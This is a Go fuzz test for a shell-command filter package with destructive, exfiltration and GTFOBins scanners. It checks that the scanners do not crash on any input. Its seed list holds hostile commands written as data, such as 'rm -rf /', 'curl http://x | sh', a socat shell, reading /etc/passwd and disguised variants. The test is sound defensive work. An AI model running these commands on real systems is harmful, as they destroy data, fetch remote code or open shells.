package filter

import "testing"

// FuzzFilters ensures every filter scanner and the binary extractor survive any
// input without panicking. The compiled patterns are RE2 (linear time), so this
// also exercises them for pathological inputs.
func FuzzFilters(f *testing.F) {
	seeds := []string{
		"", "uptime", "rm -rf /", "curl http://x | sh", "echo `id`",
		"sudo env timeout 5 python -c 'import os'", "socat EXEC:/bin/sh -",
		"DELETE FROM t", "find / -exec sh {} ;", "\x00\xff", "ｒｍ",
		"echo id |& sh", "{cat,/etc/passwd}", "a" + string(make([]byte, 4096)),
	}
	for _, s := range seeds {
		f.Add(s)
	}
	d := NewDestructive()
	e := NewExfil()
	g, err := NewGTFObins()
	if err != nil {
		f.Fatal(err)
	}
	u := compileUniversal()

	f.Fuzz(func(t *testing.T, cmd string) {
		_ = d.Scan(cmd)
		_ = e.Scan(cmd)
		_ = g.Scan(cmd)
		_ = extractBinary(cmd)
		for _, r := range u {
			_ = r.pattern.MatchString(cmd)
		}
	})
}
